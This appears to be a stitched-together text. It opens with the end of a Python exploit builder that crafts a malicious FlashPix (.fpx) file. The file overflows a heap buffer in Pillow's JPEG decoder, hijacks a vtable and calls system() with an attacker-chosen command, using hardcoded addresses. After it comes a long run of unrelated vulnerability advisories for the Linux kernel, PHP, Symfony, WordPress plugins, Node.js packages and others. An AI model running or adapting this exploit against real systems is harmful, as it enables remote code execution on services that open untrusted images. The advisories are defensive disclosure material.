    dsec = math.ceil(6 * 128 / SECT); content = dsec + sum(ns(sd[k]) for k in order)
    fsec = 1
    while fsec * 128 < fsec + content: fsec += 1
    pos = {}; cur = fsec; dstart = cur; cur += dsec
    for k in order: pos[k] = cur; cur += ns(sd[k])
    total = cur
    fat = [FREESECT] * (fsec * 128)
    for s in range(fsec): fat[s] = FATSECT
    def chain(a, n):
        for j in range(n): fat[a + j] = a + j + 1 if j < n - 1 else ENDOFCHAIN
    chain(dstart, dsec)
    for k in order: chain(pos[k], ns(sd[k]))
    def de(nm, t, ch, l, r, st, sz, cl=b"\x00" * 16):
        n = (nm.encode("utf-16-le") + b"\x00\x00").ljust(64, b"\x00")[:64]
        return (n + struct.pack("<HBB", min((len(nm) + 1) * 2, 64), t, 1) + o32(l) + o32(r)
                + o32(ch) + cl + o32(0) + b"\x00" * 16 + o32(st) + struct.pack("<Q", sz))
    directory = pad(b"".join([
        de("Root Entry", 5, 1, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0, FPX_CLSID),
        de("Data Object Store 000001", 1, 2, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),
        de("\x05Image Contents", 2, NOSTREAM, NOSTREAM, 3, pos["ic"], len(sd["ic"])),
        de(RESNAME, 1, 4, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),
        de("Subimage 0000 Data", 2, NOSTREAM, NOSTREAM, 5, pos["dat"], len(sd["dat"])),
        de("Subimage 0000 Header", 2, NOSTREAM, NOSTREAM, NOSTREAM, pos["hdr"], len(sd["hdr"]))]))
    h = bytearray(512); h[0:8] = bytes.fromhex("D0CF11E0A1B11AE1")
    for o, fmt, *v in [(24, "<HH", 0x3E, 3), (28, "<H", 0xFFFE), (30, "<HH", 9, 6), (44, "<I", fsec),
                       (48, "<I", dstart), (56, "<I", 4096), (60, "<I", ENDOFCHAIN), (68, "<I", ENDOFCHAIN)]:
        struct.pack_into(fmt, h, o, *v)
    for i in range(109): struct.pack_into("<I", h, 76 + i * 4, i if i < fsec else FREESECT)
    secs = [b""] * total
    for s in range(fsec): secs[s] = b"".join(o32(x) for x in fat[s * 128:(s + 1) * 128])
    for j in range(dsec): secs[dstart + j] = directory[j * SECT:(j + 1) * SECT]
    for k in order:
        for j in range(ns(sd[k])): secs[pos[k] + j] = sd[k][j * SECT:(j + 1) * SECT]
    open(out, "wb").write(bytes(h) + b"".join(secs))

def xhex(s): return int(s, 16)

SYSTEM_PLT = 0x4206c0   # system@plt in the image's non-PIE python3.12 (fixed, no libc leak)

def main():
    ap = argparse.ArgumentParser(description="F-JPEG-1 .fpx payload builder (0-ASLR box)")
    ap.add_argument("--out", required=True, help="output .fpx path")
    ap.add_argument("--crash", action="store_true",
                    help="crash mode: flood an adjacent ob_type with 0x42.. and SIGSEGV (no addresses)")
    ap.add_argument("--heap-base", type=xhex, default=0xbaa000,
                    help="fixed heap base of the 0-ASLR box (default 0xbaa000)")
    ap.add_argument("--offset", type=xhex, default=0x21e800,
                    help="state->buffer - heap_base (default 0x21e800 -> S=0xdc8800)")
    ap.add_argument("--target", type=xhex, default=SENTINEL,
                    help="value called via the hijacked vtable; pass %#x (system@plt) for "
                         "command execution (default is a sentinel for an RIP-control demo)" % SYSTEM_PLT)
    ap.add_argument("--cmd", default="id",
                    help="command system() runs, written inline at obj+0 / rdi (<=7 bytes, e.g. id, id;w)")
    a = ap.parse_args()

    if a.crash:
        # Pillow's CMYK JPEG path decodes inverted (decoded = 255 - src), so flood source 0xBD
        # to make the decoded overflow bytes 0x42 -> the adjacent ob_type becomes 0x4242424242424242.
        build_fpx(jpeg(bytes([0xBD]) * (W * H * 4)), a.out)
        print("[crash] %s: opening it overwrites an adjacent ob_type with 0x4242424242424242 "
              "-> SIGSEGV in PyBuffer_Release (no addresses)" % a.out)
        return

    if len(a.cmd.encode()) > 7:
        sys.exit("--cmd must be <=7 bytes (it is written inline at obj+0, before ob_type)")
    S = a.heap_base + a.offset
    A0, A1, B0, B1 = 0x2000, 0xA000, 0x100, 0x2000     # spray A = fake type, spray B = TARGET
    tg = [(OB_TYPE_OFF, p64(S + (A0 + A1) // 2)),
          (OB_TYPE_OFF - 8, a.cmd.encode() + b"\x00")]      # obj+0 -> rdi for system()
    tg += [(o, p64(S + 0x100)) for o in range(A0, A1, 8)]   # fake type -> spray B at +0xa0..+8
    tg += [(o, p64(a.target)) for o in range(B0, B1, 8)]
    jpg, it, bad = craft(tg)
    build_fpx(jpg, a.out)
    print("[control] %s: S=%#x target=%#x cmd=%r craft_iters=%d bad=%d"
          % (a.out, S, a.target, a.cmd, it, bad))
    print("[control] opening it: vtable hijack -> call *%#x with rdi -> %r" % (a.target, a.cmd))

if __name__ == "__main__":
    main()
```

In the Linux kernel, the following vulnerability has been resolved:

tcp: prevent collapsing skbs across boundary in rtx queue

tcp_write_collapse_fence() sets TCP_SKB_CB(skb)->eor = 1 on
tcp_write_queue_tail(sk) to prevent skbs queued after a switch to
device encryption from being collapsed into earlier skbs.

The fence is a no-op if all earlier data has already been transmitted
when the switch happens: sk->sk_write_queue is empty. The not yet
acknowledged earlier skbs wait in sk->tcp_rtx_queue with eor 0.

On a subsequent retransmit or SACK shift, tcp_retrans_try_collapse() or
tcp_shift_skb_data() can then merge an skb queued after the switch into
one queued before it.

Both users of the fence are affected:

- psp: devices only encrypt skbs with skb->decrypted set. The merged skb
  keeps decrypted = 0 from the earlier skb, so merged data sent after
  psp_sock_assoc_set_tx() is retransmitted in cleartext.

- tls device offload: the merged skb straddles the start marker set in
  tls_set_device_offload(). The software fallback (fill_sg_in() returns
  -EINVAL) and the mlx5, nfp and funeth drivers cannot handle such an
  skb and drop it. Every retransmit rebuilds the same skb, so the
  connection stalls.

Fix this in two places, for defense in depth:

1. Fall back to tcp_rtx_queue_tail(sk) in tcp_write_collapse_fence()
   when tcp_write_queue_tail(sk) is NULL.

2. Check !skb_cmp_decrypted(to, from) in tcp_skb_can_collapse(), as
   tcp_skb_can_collapse_rx() does on receive. skb_shift(), which both
   collapse paths call, already has a DEBUG_NET_WARN_ON_ONCE() for this
   condition.

items.description: phar_tar_number() parses the octal size field of a TAR header into a uint32_t with no overflow check. The field is 11 octal digits wide and holds values up to 0x1FFFFFFFF, so a size above 0xFFFFFFFF silently wraps. The parser then skips the wrong number of data blocks and interprets attacker-controlled file content as the next TAR header, which lets a crafted archive inject entries that PharData reports and extracts as if they were genuine.

PHP's OpenSSL stream peer verification checks the certificate's subjectAltName entries first and, whenever no entry matches, falls back to the Common Name. RFC 6125 requires the CN to be ignored once the certificate presents any service identity, so a certificate carrying a non-matching DNS SAN was still accepted when its CN matched the requested peer_name. A certificate trusted by the client for one name can therefore be used to impersonate another.

items.title: Happy DOM: Incomplete fix for CVE-2026-33943: unsanitized import alias leads to host code execution
items.description: Happy DOM is a JavaScript implementation of a web browser without its graphical user interface. From 17.0.0 until 21.0.4, packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts accepts a named ESM import alias without validating that it is a JavaScript binding identifier before inserting it into a generated destructuring binding. With enableJavaScriptEvaluation enabled, attacker-controlled HTML or module source can use an invalid alias that becomes a valid default initializer after compilation, causing the generated JavaScript to execute in the Node.js host process. The demonstrated reachable path uses a JSON module import attribute, which prevents the malicious alias from being emitted again in a later ESM circular-import assignment and keeps the generated function syntactically valid. This incomplete fix for CVE-2026-33943 is a distinct residual path because the earlier remediation validated the local export importName path but not the named-import alias. This issue is fixed in version 21.0.4.

In the Linux kernel, the following vulnerability has been resolved:

tcp: fix use-after-free of retransmit_skb_hint in tcp_send_synack()

When tcp_send_synack() replaces the cloned SYN skb at the head of the
retransmit queue with a copy, it frees the original with
tcp_rtx_queue_unlink_and_free() and only repairs tp->highest_sack.
tp->retransmit_skb_hint keeps pointing at the freed
skbuff_fclone_cache object.

The dangling hint is read in tcp_verify_retransmit_hint() and used as
the root of the rbtree walk in tcp_xmit_retransmit_queue().  An
unprivileged TFO client (sendmsg(MSG_FASTOPEN)) can arm the hint with
an attacker-supplied ICMP fragmentation-needed message, after which a
simultaneous open frees the armed SYN skb:

  BUG: KASAN: slab-use-after-free in tcp_mark_skb_lost (net/ipv4/tcp_input.c:1316)
  Read of size 4 at addr ffff88800604d928 by task swapper/1/0
  Call Trace:
   tcp_mark_skb_lost (net/ipv4/tcp_input.c:1316)
   tcp_simple_retransmit (net/ipv4/tcp_input.c:3158)
   tcp_v4_err (net/ipv4/tcp_ipv4.c:587)

Sync the hint to the copy.

In the Linux kernel, the following vulnerability has been resolved:

smb: client: use finish_no_open() for non-regular inodes

An O_CREAT open can find an existing symlink or another non-regular
inode. cifs_atomic_open() calls finish_open() on it and attaches a
cifsFileInfo. Symlink inodes have no CIFS release operation, so the
dentry reference held by cifsFileInfo is leaked. FMODE_OPENED also
prevents the VFS from following the symlink.

Track whether cifs_do_create() returned an open server handle. For
non-regular inodes, close the handle if present, remove the pending
open, and call finish_no_open() so the VFS can continue the lookup.
Do not set FMODE_CREATED unless a regular file was opened. For
O_NOFOLLOW with __O_REGULAR, return -ELOOP before the VFS's
-EFTYPE check.

Defer closing a legacy POSIX handle on a non-regular inode until
after inode lookup. This avoids closing it again if lookup fails.

items.title: Laravel TokenGuard authentication bypass through non-string API credentials
items.description:
Laravel's built-in TokenGuard, **when configured with a standard token-based API guard**, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token. 

**Under certain database configurations (MySQL/MariaDB)** an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.

### Impact
An unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.

items.title: Symfony: Unbounded Recursion in the YAML Inline Lexer Lets a Single Document Crash the Process
items.description:
### Description

`Yaml\Parser::lexInlineStructure()` recursed through `lexInlineMapping()` and `lexInlineSequence()` for every `{` and `[` of an inline collection, without entering the nesting level that the rest of the parser bounds with `maxNestingLevel`. A document made of deeply nested inline collections, such as `[[[[...]]]]`, exhausted the stack while it was being lexed: depending on the PHP version and its stack settings, the process crashed or the request ended with a fatal error.

Any code parsing untrusted YAML is affected. That includes `#[MapRequestPayload]` when the Yaml component is installed and the endpoint does not restrict `acceptFormat`: a single unauthenticated request with a YAML content type is enough.

### Resolution

The inline lexer now enters and leaves the same nesting level as the rest of the parser, so nested inline collections are bounded by `maxNestingLevel`, and the parser raises a `ParseException` beyond it.

The patches for this issue are available [here](https://github.com/symfony/symfony/commit/2a8bf9c58d862b0c76a35ce288d1ba6a27223aad) for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

### Credits

We would like to thank Nicolas Grekas for reporting the issue and providing the fix.

### References

- Fix: [#65688](https://github.com/symfony/symfony/pull/65688)

items.title: Symfony: ReDoS in HeaderUtils::split() Reachable Through the Cache-Control Request Header
items.description:
### Description

`HeaderUtils::split()` parsed header values with a pattern whose token alternative also matched whitespace, followed by a `(?<!\s)` lookbehind. A run of whitespace placed before a separator could be divided among the iterations of the enclosing repetition in exponentially many ways, and the engine tried all of them before settling. `HeaderBag` calls it for the `Cache-Control` header whenever a `Request` is built, so any application handling HTTP requests is reachable, with no authentication.

A single request carrying such a header costs close to a second of CPU (813 ms for a run of 17 spaces in an 8 KB header on PHP 8.5, doubling with each extra space). From 18 spaces on, `preg_match_all()` gives up at `pcre.backtrack_limit` and `split()` returns an empty array, so every directive of the header is silently dropped.

### Resolution

The pattern now consumes whitespace only when more of the value follows it, so a value can no longer end on whitespace, nothing has to be given back, and every quantifier is possessive. The first release of this fix broke splitting on a whitespace separator: `HeaderUtils::split('foo bar', ' ')` returned a single value in 6.4.46 to 6.4.47, 7.4.19 to 7.4.20 and 8.1.7 to 8.1.8. Whitespace characters used as separators are now left out of the whitespace branch, which 6.4.48, 7.4.21 and 8.1.9 contain.

The patches for this issue are available [here](https://github.com/symfony/symfony/commit/343a1772ce6ac03e48b228d2d7168d19750e3f36) for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

### Credits

Symfony would like to thank [r3verii](https://github.com/r3verii) for reporting the issue and Nicolas Grekas for providing the fix.

toml-node is a TOML parser for Node.js and the browser. Prior to 5.0.1, the toml.parse() compiler's addTableArray() function in lib/compiler.js rescans the complete assignedPaths and valueAssignments bookkeeping sets for every array-of-tables header. Distinct [[name]] paths are not pruned, so a document with many such headers causes quadratic synchronous work and can block the Node.js event loop, denying service to other operations in the process. This issue is fixed in version 5.0.1.
Heap-based buffer overflow in Windows Installer allows an authorized attacker to elevate privileges with a physical attack.

items.title: Awesome Support <= 6.4.1 - Authenticated (Custom+) Stored Cross-Site Scripting via Ticket Attachment MIME Confusion
items.description: The Awesome Support – WordPress HelpDesk & Support Plugin plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'wpas_files' parameter in all versions up to, and including, 6.4.1 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with custom-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This vulnerability is only exploitable when the "Enable drag-n-drop uploader for ticket form" setting is enabled, as it is disabled by default.

items.title: Post Snippets <= 4.2.4 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode Attributes
items.description: The Post Snippets – Custom WordPress Code Snippets Customizer plugin for WordPress is vulnerable to Stored Cross-Site Scripting via Shortcode Attributes in all versions up to, and including, 4.2.4 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Entity-encoded payloads such as <script>...</script> survive WordPress's wp_kses_post on-save sanitization because kses does not decode HTML entities, and are only converted back into executable HTML tags at render time by the plugin's own shortcode filter. This requires snippet shortcodes to be enabled.

follow-redirects is a Node.js HTTP and HTTPS client wrapper that automatically follows redirects. From version 1.16.0 to before version 1.16.1, follow-redirects removes sensitive credential headers (Authorization, Proxy-Authorization, Cookie, and any caller-declared sensitiveHeaders) before following a redirect that crosses to a different host or downgrades to a less secure protocol. The removal routine iterates the caller's headers container with for...in and matches header names against a filter. This assumes the headers container is a plain object keyed by header names. Node's underlying http.request, which follow-redirects is a drop-in replacement for, also accepts headers as an alternating array of names and values. For an array, for...in yields the numeric indices "0", "1", "2" and so on, which never match a header-name filter, so nothing is removed. An application that sends array-form headers and follows an attacker-controlled cross-origin redirect therefore forwards its Authorization, Cookie, and Proxy-Authorization headers verbatim to the attacker-controlled destination, with no error or warning. The sensitiveHeaders option added to fix CVE-2026-40895 / GHSA-r4q5-vmmm-2653 is equally ineffective, because it relies on the same helper. This is an unauthenticated confidentiality vulnerability: any remote server the victim application contacts can harvest the victim's credential headers by responding with a cross-origin redirect. This issue has been patched in version 1.16.1.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

items.title: Netty netty-tcnative before 2.0.84.Final Heap Buffer Overflow via OpenSSL BIO
items.description: Netty netty-tcnative before 2.0.84.Final contains a heap buffer overflow vulnerability in the tcn_write_to_bytebuffer BIO callback caused by failing to wrap the non-application ring buffer write index. Remote TLS peers can drive handshake, renegotiation, or post-handshake messages into this buffer, triggering an out-of-bounds memcpy that crashes the JVM process.

netty-tcnative 2.0.66.Final before 2.0.84.Final built against OpenSSL 3.x contains a use-after-free vulnerability in ssl_tlsext_ticket_key_cb during session ticket key rotation. Remote clients performing TLS handshakes while setSessionTicketKeys0 frees the shared key array cause OpenSSL to read freed HMAC keys, crashing or corrupting ticket processing.

In the Linux kernel, the following vulnerability has been resolved:

amt: send the relay's General Query directly from the receive path

An skb queued in a qdisc can outlive the tunnel it references
through a raw pointer in skb->cb. For example, with igmp_qrv set
to 1 on the relay a tunnel lives for 135s, so a netem delay of
180s on the amt device outlives it; when the tunnel expires and is
freed, the subsequent dequeue triggers a use-after-free in
amt_dev_xmit().

  BUG: KASAN: slab-use-after-free in amt_dev_xmit+0x2763/0x2e20
  Call Trace:
   amt_dev_xmit+0x2763/0x2e20 [drivers/net/amt.c:1262]
   dev_hard_start_xmit+0x22f/0x620
   sch_direct_xmit+0x12e/0xac0
   netem_dequeue+0x333/0xc50
   net_tx_action+0x35c/0xa60

amt_send_igmp_gq() and amt_send_mld_gq() are only called from
amt_request_handler(), inside the rcu_read_lock_bh() section of
amt_rcv(). amt_request_handler() already has the tunnel the query is
for: it found or created it inside that section. Queuing the query with
dev_queue_xmit() only leads back into amt_dev_xmit(), which strips the
Ethernet header and calls amt_send_membership_query() for that tunnel.

Make that call directly from the two senders instead, the same way
amt_send_advertisement() transmits from the receive path. The query
never waits in a qdisc, the tunnel is only dereferenced inside the
RCU section that found or created it, and nothing is stored in
skb->cb, so no lookup or refcount is needed. Remove the query branch
of amt_dev_xmit(), amt_skb_cb() and struct amt_skb_cb, which have no
users left.

Behaviour changes:
 - The relay's own General Queries no longer pass through the amt
   device's egress path: its qdisc, tc egress (clsact/tcx), the
   netfilter egress hook and packet taps. They are still visible as
   UDP on the underlay.
 - A query that is sent successfully is no longer counted as
   tx_dropped. The old query branch left through the unlock label,
   which counted every sent query as dropped.
 - A query that reaches amt_dev_xmit() on a relay from elsewhere,
   such as a userspace querier, is now dropped at the IGMP/MLD type
   switch. Before, it trusted whatever skb->cb held, and a NULL
   tunnel hit the WARN_ON(1).

In the Linux kernel, the following vulnerability has been resolved:

cipso: adjust cached option offsets when removing CIPSO

cipso_v4_skbuff_delattr() removes the CIPSO bytes but does not adjust
cached offsets for options that follow them.

For example, with a valid 10-byte CIPSO option followed by a seven-byte
RR option, parsing records rr at offset 30.  Removing CIPSO moves RR to
offset 20, while the cached offset remains 30.  Consumers such as
ip_forward_options() and __ip_options_echo() then access the wrong bytes;
the latter may interpret packet data as the option length and copy it into
fixed-size option storage.

Mirror cipso_v4_delopt() and subtract cipso_len from the srr, rr, ts and
router_alert offsets when they follow CIPSO.  cipso_len is the distance
the first memmove() shifts those options.  The later header move and
network-header reset relocate the bytes and their offset base together.

In the Linux kernel, the following vulnerability has been resolved:

smb: client: fix missing iov bounds check in parse_posix_sids()

In parse_posix_sids(), sidsbuf_end is calculated using the server-supplied
out_len without being validated against the actual length of the received
iov (iov_len).

If a server provides an inflated out_len, sidsbuf_end will point past the
end of the iov. This defeats the bounds guards in posix_info_sid_size(),
allowing out-of-bounds reads into adjacent kernel memory.

Fix this by rejecting responses where the calculated sidsbuf_end would
exceed the received iov boundaries or cause pointer wraparound.

In the Linux kernel, the following vulnerability has been resolved:

smb: client: fix create context out-of-bounds reads

smb2_parse_contexts() validates the complete create-context area but
does not limit each record to its Next field before dispatching it.  A
malformed chain can therefore expose bytes beyond the current context to
a handler.  The QFid handler also used a full response-structure cast
although it only reads DiskFileId.

The SMB2/SMB3 lease parsers made the same layout assumption: they read
LeaseState and LeaseFlags at canonical offsets rather than at
DataOffset.  A valid non-canonical DataOffset could therefore yield
unrelated in-bounds data, while a short DataLength was still accepted.

Limit each context to its Next value, reject offsets before the context
header, and reject malformed chains.  Bound the name range by the current
context and do not dispatch a known handler when DataLength is zero.  Read
the QFid DiskFileId only when the context data covers that field.  Parse the
lease context from DataOffset and require DataLength to match the v1 or v2
lease_context size used by ksmbd.  A size mismatch skips lease parsing
without failing the open.

In the Linux kernel, the following vulnerability has been resolved:

ipv6: do not let ipv6_find_hdr() return an offset past the packet end

ipv6_find_hdr() walks the extension header chain, skipping each header by
the length that header itself declares.  ipv6_optlen() returns up to 2048,
and the skip is never checked against skb->len, so the offset stored in
*offset can point past the end of the packet.

openvswitch installs that offset as the transport header, and
update_ipv6_checksum() then reads and writes the transport checksum field
out of bounds:

  BUG: KASAN: slab-use-after-free in inet_proto_csum_replace16+0x445/0x470
  Read of size 2 at addr ffff88810b754b06 by task ovs_ipv6_oob/629
  CPU: 4 UID: 1000 PID: 629 Comm: ovs_ipv6_oob Tainted: G N 7.3.0-rc3+ #348
  Call Trace:
   inet_proto_csum_replace16+0x445/0x470
   set_ipv6_addr+0x3dd/0x460
   do_execute_actions+0x6a3d/0x7c40
   ovs_execute_actions+0xfd/0x480
   ovs_packet_cmd_execute+0xc38/0xf20
   genl_rcv_msg+0x59e/0x870
   netlink_rcv_skb+0x18b/0x450
   genl_rcv+0x2d/0x40
   netlink_unicast+0x6bc/0xa20

  The buggy address belongs to the object at ffff88810b754980
   which belongs to the cache skbuff_small_head of size 704
  The buggy address is located 390 bytes inside of
   freed 704-byte region [ffff88810b754980, ffff88810b754c40)

Other callers use that offset too, so bound it here rather than in one
caller.

Reject a header whose declared length does not fit in the packet.
ipv6_find_hdr() already fails with -EBADMSG on a malformed chain, so this
adds no new failure mode.

The mysqlnd wire protocol parser reads fields out of server packets before checking that the packet still holds enough bytes for them. A malicious or compromised MySQL server can send a truncated packet and make the client read past the end of the packet buffer, which is undefined behaviour and can crash the process.

Xen Orchestra before 6.9.0 contains an improper access control vulnerability that allows any authenticated user to become global administrator by abusing the unprotected vm.importFromEsxi and vm.importMultipleFromEsxi methods. Attackers can point xo-server at a malicious ESXi host serving a crafted .vmx file with __proto__.permission set, polluting Object.prototype so permission-less accounts inherit admin rights and enabling remote code execution.

In the Linux kernel, the following vulnerability has been resolved:

wireguard: noise: reject response consumption after intermediate initiation

Two threads begin processing the identical response message, received
twice. The first thread, A, runs. While it's running, the second one,
B, gets partway through, and during that slow calculation, or even while
blocking on down_write(), A completes and then also a handshake
initiation that's already been queued up runs in thread C, which itself
takes that same down_write(). The handshake initiation creation
succeeds, and sets the state back to waiting-for-response, and calls
up_write(), at which point thread B resumes, because either its finished
its calculations or was finally allowed to acquire down_write(). Thread
B then copies the state back to the peer, and begins a new session,
using that state, which is the same session as the one made in thread A.

Thread A			Thread B			Thread C

down_read()
 sA = handshake->state
 memcpy(cA, handshake->crypto)
up_read()
if (sA != 1)
 goto fail
slow_crypto(cA)
				down_read()
				 sB = handshake->state
				 memcpy(cB, handshake->crypto)
				up_read()
				if (sB != 1)
				 goto fail
				slow_crypto(cB)
down_write()
 if (sA != handshake->state)
  goto fail
 memcpy(handshake->crypto, cA)
 handshake->state = 2
up_write()
down_write()
 if (handshake->state != 2)
  goto fail
 derive_session(handshake->crypto)
up_write()
								down_write()
								 slow_crypto(handshake->crypto)
								 handshake->state = 1
								up_write()
				down_write()
				 if (sB != handshake->state)
				   goto fail
				 memcpy(handshake->crypto, cB)
				 handshake->state = 2
				up_write()
				down_write()
				 if (handshake->state != 2)
				  goto fail
				 derive_session(handshake->crypto)
				up_write()

This seems basically impossible to hit in a meaningful way in practice,
but ensure that it absolutely cannot happen by comparing the ephemeral
private key that's on the stack with the latest one that the peer's
handshake state has.

items.title: libexpat through 2.9.0 NULL Pointer Dereference via External Entity Subparser
items.description: libexpat through 2.9.0 contains a NULL pointer dereference vulnerability in externalEntityInitProcessor2() in lib/xmlparse.c that mishandles the XML_TOK_NONE token from empty input. Attackers who control stream chunking can force an empty non-final first parse on an external entity subparser, causing a later parse to crash the application.

items.title: libexpat through 2.9.0 Integer Overflow in storeAtts via attIndex and nPrefixes
items.description: libexpat through 2.9.0 contains a signed integer overflow vulnerability in storeAtts() in lib/xmlparse.c that allows attackers to trigger out-of-bounds writes via oversized attribute counts. Attackers can supply a multi-gigabyte document with a start tag carrying over 2^30 attributes to overflow attIndex and nPrefixes, crashing applications or corrupting heap memory.

The MongoDB Shell (mongosh) relies on Node.js as a third-party runtime that carries its own TLS root certificate store. This certificate store has the recoverable eMudhra intermediate CA certificates. This issue impacts MongoDB Shell (mongosh) versions prior to 2.14.0 and can be resolved by updating to mongosh 2.14.0 which bundles Node.js 24.22.1 or later. If mongosh is installed through npm, it uses the Node.js runtime installed on the host; update that runtime separately.

ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0, the unauthenticated Rich Text CSV conversion route writes a multipart upload to the system temporary directory before checking its extension and does not remove the staged file when that validation rejects it. Repeated large rejected uploads, using the normal public CSRF cookie, can persistently consume temporary-disk capacity and may disrupt ApostropheCMS and other services that depend on the same partition. This issue is fixed in version 4.33.0.

items.title: MSAL Node authorization code flow may disclose parameters to an attacker-controlled endpoint
items.description:
### Impact

Origin validation error in Microsoft Authentication Library (MSAL) for Node.js allows an unauthorized attacker to disclose information over a network. This affects the auth_code flow.

### Patches

Version 7.1.0 and higher are patched.

### Workarounds

Ensure you pass in only the auth_code to to acquireTokenByCode

items.title: undici vulnerable to Denial of Service via unhandled error on excessive content-encodings
items.description:
### Impact

undici's `fetch()` crashes the Node.js process when a malicious server returns a response with more than five content codings and closes the connection before sending the body. undici rejects such responses (a content-encoding limit), but it created the internal response stream before that check and returned without attaching an error listener or aborting the request. The early close then surfaces a content-length mismatch on that orphaned internal stream, which Node.js treats as an unhandled `error` and terminates the process. A remote, unauthenticated server can trigger this with a single response, even when the application correctly catches the `fetch()` rejection. undici 6.x, 7.x, and 8.x are affected.

### Patches

Upgrade to `6.29.1`, `7.30.1`, or `8.12.2`. undici now validates the content-encoding chain before creating the internal body stream and aborts the response when the limit is exceeded, so no error can surface on an orphaned stream.

### Workarounds

None.

items.title: multer vulnerable to Denial of Service via a pending asynchronous fileFilter after request teardown
items.description:
### Impact

When `multer` is configured with an asynchronous `fileFilter`, a single request can crash the Node.js process. If a request is aborted (for example when one file is rejected) while another file's async `fileFilter` is still pending, the pending callback later resumes a parsing stream that multer has already torn down. busboy then emits an error on a stream that no longer has an error listener, which Node raises as an unhandled `'error'` event, and the process exits. A single unauthenticated request is enough, so any application using `multer` with an asynchronous `fileFilter` is affected, regardless of storage engine. Uploads using a synchronous `fileFilter` are not affected.

### Patches

Users should upgrade to `multer` `2.5.0` or later.

### Workarounds

Use a synchronous `fileFilter`.

In the Linux kernel, the following vulnerability has been resolved:

btrfs: restore active device pointers after failed sprout

btrfs_init_new_device() switches latest_dev and possibly s_bdev from the
seed device to the new sprout device before creating the first writable
chunks.

If chunk creation or the subsequent sprout setup fails, the error path
releases the new device without switching those pointers back.
btrfs_show_devname() can then dereference the freed latest_dev and crash.

Restore the active device pointers to the latest seed device before
removing and releasing the failed sprout device.

In the Linux kernel, the following vulnerability has been resolved:

btrfs: detach failed sprout device from transaction update list

When creating the first metadata chunk for a sprout filesystem,
create_chunk() adds the new device to the transaction dev_update_list
through device->post_commit_list.

If the subsequent system chunk creation fails, btrfs_init_new_device()
aborts the transaction and releases the device while post_commit_list is
still linked. This triggers a warning in btrfs_free_device() and leaves
the transaction list referencing freed memory.

Detach the device while holding chunk_mutex before releasing it.

In the Linux kernel, the following vulnerability has been resolved:

ASoC: amd: yc: fix memory leak in acp6x_pdm_dma_close()

acp6x_pdm_dma_close() does not free the runtime->private_data buffer
allocated in acp6x_pdm_dma_open(). Add the missing kfree.

In the Linux kernel, the following vulnerability has been resolved:

staging: fbtft: make dirty_lock IRQ-safe

fbtft_mkdirty() can be reached from the fbcon rendering path while
processing printk() in hardirq context. Meanwhile, dirty_lock is also
taken by fbtft_deferred_io() in workqueue context with local interrupts
enabled.

Lockdep reports a possible IRQ lock inversion involving dirty_lock and
console_owner. A hardirq can interrupt a CPU holding dirty_lock and
enter the console rendering path, which can attempt to acquire
dirty_lock again.

The following lockdep report was observed on an RK3566 system with
CONFIG_PROVE_LOCKING enabled:

  WARNING: possible irq lock inversion dependency detected
  swapper/2/0 just changed the state of lock:
  (console_owner){-...}-{0:0}
  but this lock took another, HARDIRQ-unsafe lock in the past:
  (&par->dirty_lock){+.+.}-{2:2}

  CPU0                    CPU1
  ----                    ----
  lock(&par->dirty_lock);
                         local_irq_disable();
                         lock(console_owner);
                         lock(&par->dirty_lock);
  <Interrupt>
    lock(console_owner);

  *** DEADLOCK ***

Use spin_lock_irqsave() for fbtft_mkdirty() and spin_lock_irq() for
fbtft_deferred_io(). They only access the dirty line range, so the
IRQ-off regions remain short.

In the Linux kernel, the following vulnerability has been resolved:

af_packet: Don't cast tpacket_hdr.tp_len to int in tpacket_parse_header().

syzbot reported BUG() in sock_sendmsg_nosec(). [0]

The problem is that tpacket_parse_header() casts user-provided
tpacket_hdr.tp_len, which is u32, to int.

If the length is larger than INT_MAX, the following condition
in tpacket_parse_header() passes,

  if (unlikely(tp_len > size_max))

and any negative value can be returned to the caller, up to
sock_sendmsg_nosec().

The repro set tpacket_hdr.tp_len to 0xfffffdef, which is cast
to -EIOCBQUEUED (-529), triggering BUG() in sock_sendmsg_nosec().

  *(uint64_t*)0x200000000008 = 0xfffffdef;
  ...
  syscall(__NR_write, /*fd=*/r[0], /*buf=*/0x200000000000ul, /*count=*/1ul);

Let's define the local tp_len as u32 in tpacket_parse_header().
